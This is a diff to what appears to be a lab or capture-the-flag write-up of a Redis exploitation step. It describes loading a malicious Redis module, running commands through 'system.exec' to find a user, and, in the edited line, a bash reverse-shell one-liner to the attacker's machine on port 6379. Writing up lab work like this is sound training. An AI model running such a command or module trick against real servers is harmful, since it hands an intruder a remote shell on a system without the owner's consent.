@@ -178,7 +178,7 @@ Enumerated top 200 UDP ports:
 ---
 
 # Exploitation
-## Name of the technique
+## Uploaded Redis module to FTP server
 
 #### -Followed the "Load Redis Module" steps listed in the hacktricks website:
 
@@ -217,7 +217,7 @@ Enumerated top 200 UDP ports:
 #### -Typed "sytem.exec "id" " and found username "pablo"
 ![](Pasted%20image%2020221110134928.png)
 
-#### -I then typed " "/bin/bash -i >& /dev/tcp/[tun0 kali IP]/6379 0>&1" '',started a penelope listener on my kali machine and received a reverse shell:
+#### -I then typed " system exec"/bin/bash -i >& /dev/tcp/[tun0 kali IP]/6379 0>&1". Then started a penelope listener on my kali machine and received a reverse shell:
 
 ![](Pasted%20image%2020221110135022.png)
 
